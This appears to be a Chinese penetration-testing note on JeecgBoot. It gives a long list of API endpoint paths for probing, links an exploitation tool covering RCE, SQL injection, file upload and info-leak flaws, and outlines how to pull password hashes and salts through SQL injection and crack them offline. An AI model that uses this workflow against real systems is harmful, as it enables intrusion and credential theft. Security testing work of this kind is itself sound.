</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/act/task/complete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/act/task/history</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/common/upload</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/common/download/{fileId}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/common/view/{fileId}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/monitor/redis/info</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/monitor/server/info</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/test/demo/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/test/demo/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/log/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/log/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/sms/send</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/sms/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/test/demo/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/test/demo/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/report/loadReport/{code}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/chart/api/getChartData</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/test/demo/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/act/process/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/dict/loadDictItems/{dictCode}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/getLoginQrcode</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/getQrcodeToken</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/login</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/phoneLogin</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/scanLoginQrcode</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDataSource/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDataSource/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDataSource/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDataSource/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDataSource/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDataSource/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/addGroup</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/delDragDataSetHeadGroup</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetHead/updateGroup</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetParam/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetParam/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/druid/login.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetParam/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetParam/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/actuator/httptrace</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetParam/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/onlDragDatasetParam/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/drag/websocket/sendData</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/checkByCode</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/checkRule/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/addFile</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/addText</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/deleteOne</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/fileList</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/listByForm</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/comment/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dataSource/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dataSource/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dataSource/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dataSource/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dataSource/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dataSource/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/dictItem/dictItemCheck</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/duplicate/check</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/files/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/files/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/files/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/files/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/files/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/files/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/fillRule/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/fillRule/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/fillRule/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/fillRule/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/fillRule/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/fillRule/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/formFile/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/formFile/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/formFile/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/formFile/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/formFile/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/formFile/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/queryByCode</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/position/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/quartzJob/pause</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/quartzJob/resume</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/randomImage/</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartPermission/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartPermission/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartPermission/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartPermission/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartPermission/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartPermission/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartRole/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartRole/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartRole/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartRole/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartRole/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysDepartRole/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/queryByCode</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/sysRoleIndex/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/dynamic/test1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/jeecgDemo/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/jeecgDemo/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/jeecgDemo/deleteBatch</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/jeecgDemo/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/jeecgDemo/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/test/jeecgDemo/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/user/addSysUserRole</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/role/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/user/register</font>

## <font style="color:rgba(0, 0, 0, 0.85);">常见jeecg-boot漏洞利用工具</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">https://github.com/Framework-vulnerability-tool/jeecg</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">工具介绍</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg综合漏洞利用工具,程序采用javafx开发,环境JDK 1.8 声明：仅用于授权测试，用户滥用造成的一切后果和作者无关 请遵守法律法规！ 漏洞收录如下：</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot queryFieldBySql远程命令执行漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot testConnection远程命令执行漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">JeecgBoot jmreport/loadTableData SSTI模板注入漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-queryTableData-sqli注入漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-getDictItemsByTable-sqli注入漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Jeecg-Boot qurestSql-SQL注入漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot commonController 任意文件上传漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot jmreport任意文件上传漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-querySysUser信息泄露漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-checkOnlyUser信息泄露漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-httptrace信息泄露漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-任意文件下载漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-jeecgFormDemoController漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-v2 sys/duplicate/check注入漏洞</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">jeecg-boot-v2 AviatorScript表达式注入漏洞</font>

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589516945-acedefee-bbb6-4159-9b8b-ec70d937a26f.webp)

<font style="color:rgb(51, 51, 51);">有时候我们检测到了sql注入漏洞但是无法getshell，可以另辟蹊径，直接读取密码文件然后进行解密。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">https://github.com/ssrsec/JeecgBoot-offline-brute</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">有sqli的端点，但是无法rce以及进一步获得权限，我们可以尝试通过sqli获取凭据从而获得用户级权限</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">数据库中</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">password</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">字段是加密的，通过查看源码发现密码使用PBE进行加密，关键是用明文密码作为对称加密key的一个环节，所以没办法直接逆向解密，但是可以离线爆破。</font>

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589516971-466797ae-c2f6-4654-a576-99a59274e830.webp)

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589517284-2d22399d-f3f9-45b5-8ead-76d123304b29.webp)

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589517266-3f55250c-6645-41d5-9cf1-15267d606c1f.webp)

<font style="color:rgb(51, 51, 51);">实现过程</font>

<font style="color:rgb(51, 51, 51);">  
</font>

<font style="color:rgb(51, 51, 51);">过程非常简单，直接捞出加密过程，然后通过sqli将数据库中的</font>`<font style="color:rgb(51, 51, 51);">用户名</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);">加密后的密码</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);">salt</font>`<font style="color:rgb(51, 51, 51);">取出来，然后直接用字典跑就行～</font>

<font style="color:rgb(51, 51, 51);">先取出对应的数据，放到根目录下的</font>`<font style="color:rgb(51, 51, 51);">data.json</font>`<font style="color:rgb(51, 51, 51);">，然后准备一个字典，放到根目录下的</font>`<font style="color:rgb(51, 51, 51);">pass.txt</font>`

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589517520-644b7387-1c1b-440c-b9e6-bfac6e6b2b7f.webp)

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589517859-06a4d70d-5ab6-4705-9ba8-6c9394d7956b.webp)

```plain
java -jar JeecgBoot-offline-brute.jar
```

![](https://cdn.nlark.com/yuque/0/2025/webp/26698826/1751589517817-118605bf-e7c5-4887-a1e5-5bbe7c96ecec.webp)

